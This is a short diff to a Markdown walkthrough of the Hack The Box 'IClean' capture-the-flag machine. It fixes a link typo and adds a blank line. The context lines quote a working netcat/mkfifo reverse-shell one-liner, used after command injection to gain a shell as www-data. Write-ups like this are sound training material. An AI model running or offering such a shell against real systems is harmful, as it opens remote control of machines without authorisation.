@@ -12,7 +12,7 @@ tags: [CTF, HTB]     # TAG names should always be lowercase
 ## Introduction
 
 - **Name** : IClean
-- **Author** : [LazyTitan33](https://app.hackthebox.com/users/512308)]
+- **Author** : [LazyTitan33](https://app.hackthebox.com/users/512308)
 - **Difficulty** : Medium
 - **OS** : Linux
 
@@ -188,6 +188,7 @@ Inject the payload and you can see that we can execute command as ``www-data`` :
 Setup a listener and get a reverse shell with ``rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {YOUR-IP} 1337 >/tmp/f`` : 
 
 ![Reverse Shell](../assets/img/IClean/rev.png)
+
 
 ## User Flag
 
